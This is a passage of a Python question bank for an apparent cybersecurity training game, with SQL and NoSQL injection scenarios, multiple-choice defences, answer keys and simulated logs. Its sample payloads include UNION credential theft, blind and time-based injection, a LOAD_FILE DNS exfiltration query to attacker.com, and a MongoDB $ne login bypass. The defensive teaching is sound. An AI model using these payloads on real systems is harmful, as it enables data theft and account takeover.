                ("limit_results",         "Limit search results to 10 per page"),
                ("block_keywords",        "Block keywords like 'OR', 'AND', 'SELECT'"),
            ],
            "correct": "parameterized_queries",
            "hint": "JavaScript validation is client-side and trivially bypassed. Keyword blocking misses many variants. Only parameterized queries work.",
            "explanation": "Client-side JS and keyword blacklists are both bypassable. Parameterized queries fix it at the database driver level.",
            "logs": "DB|Query: SELECT * FROM products WHERE name='' OR '1'='1'|ALERT|Full table dump — all products exposed|DB|10,000 product records returned|ALERT|Tautology injection: '1'='1' always true|SYSTEM|Data exfiltration via search endpoint",
        },
    ],

    "intermediate": [
        {
            "id": "sq_i1",
            "title": "UNION-Based Data Exfiltration",
            "description": "Attacker using UNION SELECT to steal user credentials via the search API.",
            "query": "SELECT name FROM products WHERE id=1 UNION SELECT password FROM users--",
            "query_note": "UNION appends the users.password column to product results.",
            "options": [
                ("parameterized_queries", "Use parameterized queries + stored procedures"),
                ("waf_only",              "Deploy a Web Application Firewall (WAF)"),
                ("disable_union",         "Disable UNION keyword in the database config"),
                ("encode_output",         "HTML-encode all output before displaying"),
            ],
            "correct": "parameterized_queries",
            "hint": "WAFs can be bypassed with encoding tricks. Disabling UNION breaks legitimate queries. Parameterized queries + stored procedures is the complete fix.",
            "explanation": "UNION injection exfiltrates data by appending queries. Parameterized queries prevent the UNION from being injected at all.",
            "logs": "DB|UNION injection on /api/products|ALERT|UNION SELECT password FROM users detected!|DB|Password hashes of 8,200 users leaked|ALERT|Data exfiltration confirmed — credentials at risk|SYSTEM|Immediate: rotate all credentials",
        },
        {
            "id": "sq_i2",
            "title": "Blind Boolean Injection",
            "description": "Attacker using boolean-based blind injection to infer database structure one bit at a time.",
            "query": "SELECT * FROM orders WHERE id=1 AND SUBSTRING(password,1,1)='a'",
            "query_note": "True/false responses reveal one character of the password at a time.",
            "options": [
                ("disable_errors",        "Disable detailed database error messages"),
                ("parameterized_queries", "Use parameterized queries (prepared statements)"),
                ("rate_limiting",         "Add request rate limiting to the API"),
                ("encrypt_db",            "Encrypt the database at rest"),
            ],
            "correct": "parameterized_queries",
            "hint": "Blind injection works even without error messages. Rate limiting slows but doesn't stop it. Only parameterized queries prevent the injection.",
            "explanation": "Boolean blind injection works by comparing true/false responses even with no errors shown. Only parameterized queries block it.",
            "logs": "DB|Blind boolean injection on /api/orders|ALERT|SUBSTRING(password,1,1)='a' pattern detected|DB|Attacker inferring passwords character by character|ALERT|1,200 requests in 5 min — automated extraction|SYSTEM|All user passwords potentially compromised",
        },
        {
            "id": "sq_i3",
            "title": "Time-Based Blind SQLi",
            "description": "Time-based blind injection using SLEEP() to extract data by measuring response delays.",
            "query": "SELECT * FROM users WHERE id=1 AND IF(1=1,SLEEP(5),0)--",
            "query_note": "Response delay of 5 seconds confirms injection is working.",
            "options": [
                ("timeout_queries",       "Set database query timeout to 1 second"),
                ("block_sleep",           "Block SLEEP() and WAITFOR in a stored procedure"),
                ("parameterized_queries", "Use parameterized queries (prepared statements)"),
                ("monitor_delays",        "Set up monitoring for slow database queries"),
            ],
            "correct": "parameterized_queries",
            "hint": "Blocking SLEEP() is a blacklist approach — attackers use BENCHMARK() or heavy queries instead. Parameterized queries fix the root cause.",
            "explanation": "Time-based injection uses delays to exfiltrate data. Blocking SLEEP is a cat-and-mouse game; parameterized queries prevent injection entirely.",
            "logs": "DB|Time-based blind SQLi detected|ALERT|SLEEP(5) causing 5-second response delays|DB|Attacker mapping database schema via timing|ALERT|Automated tool extracting table/column names|SYSTEM|Response time anomaly: avg 5.2s (normal 0.1s)",
        },
    ],

    "expert": [
        {
            "id": "sq_e1",
            "title": "Second-Order SQL Injection",
            "description": "Malicious input stored safely then executed dangerously later during password change.",
            "query": "-- Stored username: admin'--\n-- Later used in: UPDATE users SET pass=? WHERE username='admin'--'",
            "query_note": "The injected username was safe on input but dangerous when reused in UPDATE query.",
            "options": [
                ("parameterized_queries", "Use parameterized queries everywhere data is used, not just on input"),
                ("sanitize_on_input",     "Sanitize and escape all data on first input only"),
                ("stored_procedures",     "Move all queries to stored procedures"),
                ("audit_logging",         "Enable full database audit logging"),
            ],
            "correct": "parameterized_queries",
            "hint": "Second-order injection escapes input but re-uses stored data unsafely later. Parameterized queries must be used EVERYWHERE the data is used.",
            "explanation": "Second-order injection: clean on INSERT but injected on reuse. Parameterized queries at every query point is the only complete fix.",
            "logs": "DB|Second-order SQLi in password change flow|ALERT|Username 'admin'--' stored — safe at INSERT|ALERT|Reused in UPDATE without parameterization — INJECTED!|DB|Admin password changed by attacker|SYSTEM|Account takeover via second-order injection",
        },
        {
            "id": "sq_e2",
            "title": "Out-of-Band SQLi (DNS Exfil)",
            "description": "Advanced OOB injection using DNS lookups to exfiltrate data out-of-band.",
            "query": "SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\x'))",
            "query_note": "Makes the DB server do a DNS lookup to attacker.com — exfiltrating DB version out-of-band.",
            "options": [
                ("block_dns",             "Block outbound DNS from the database server"),
                ("parameterized_queries", "Use parameterized queries + disable FILE/LOAD_FILE privileges"),
                ("ids_monitoring",        "Deploy IDS to detect DNS exfiltration"),
                ("network_segmentation",  "Segment the database server in a separate VLAN"),
            ],
            "correct": "parameterized_queries",
            "hint": "Network controls help but the root fix is parameterized queries. Disabling FILE privilege is an extra hardening step.",
            "explanation": "OOB injection exfiltrates data via DNS/HTTP from the DB server itself. Parameterized queries + least-privilege DB accounts prevent this.",
            "logs": "DB|Out-of-band injection via LOAD_FILE|ALERT|DNS query to attacker.com — data exfiltration!|DB|DB version, hostname exfiltrated via DNS|ALERT|DB server making outbound DNS requests (abnormal)|SYSTEM|Revoke FILE privilege — harden DB account permissions",
        },
        {
            "id": "sq_e3",
            "title": "NoSQL Injection (MongoDB)",
            "description": "NoSQL injection bypassing MongoDB authentication using $ne operator.",
            "query": "db.users.find({username: 'admin', password: {$ne: ''}}) ",
            "query_note": "$ne: '' means password NOT EQUAL to empty — matches any non-empty password.",
            "options": [
                ("parameterized_queries", "Use parameterized queries / input validation against JSON operator injection"),
                ("switch_to_sql",         "Migrate from MongoDB to PostgreSQL"),
                ("encrypt_passwords",     "Encrypt all passwords in MongoDB"),
                ("add_api_key",           "Add API key authentication in front of MongoDB"),
            ],
            "correct": "parameterized_queries",
            "hint": "NoSQL injection uses operators like $ne, $gt instead of SQL syntax. The fix is still the same: validate/sanitize input and use safe query builders.",
            "explanation": "MongoDB $ne injection bypasses auth by accepting any non-empty password. Input validation + safe query builders (like mongoose sanitize) prevent this.",
            "logs": "DB|MongoDB NoSQL injection detected|ALERT|{password: {$ne: ''}} operator injection!|DB|Admin auth bypassed — all admin data accessible|ALERT|NoSQL operator injection: $ne, $gt, $regex possible|SYSTEM|Sanitize MongoDB queries — reject operator keys in input",
        },
    ],
}


# ══════════════════════════════════════════════════════════════════════════════
# PUBLIC API — called by game_controller.py
# ══════════════════════════════════════════════════════════════════════════════

def get_question(attack_type: str, difficulty: str, exclude_ids: list = None) -> dict:
    """
    Return a random question for the given type and difficulty.
    Excludes already-used IDs in this session to avoid repeats.
    Falls back to any difficulty if none left.
    """
    banks = {
        "phishing":   PHISHING_QUESTIONS,
        "bruteforce": BRUTEFORCE_QUESTIONS,
        "ddos":       DDOS_QUESTIONS,
        "sqli":       SQLI_QUESTIONS,
    }
    bank = banks.get(attack_type, {})
    exclude_ids = exclude_ids or []

    pool = [q for q in bank.get(difficulty, []) if q["id"] not in exclude_ids]
    if not pool:
        # Fallback: try other difficulties
        all_qs = [q for qs in bank.values() for q in qs if q["id"] not in exclude_ids]
        pool = all_qs if all_qs else list(bank.get(difficulty, []))

    if not pool:
        return None
    return random.choice(pool)


def get_all_ids_for_type(attack_type: str, difficulty: str) -> list:
    banks = {
        "phishing":   PHISHING_QUESTIONS,
        "bruteforce": BRUTEFORCE_QUESTIONS,
        "ddos":       DDOS_QUESTIONS,
        "sqli":       SQLI_QUESTIONS,
    }
    return [q["id"] for q in banks.get(attack_type, {}).get(difficulty, [])]
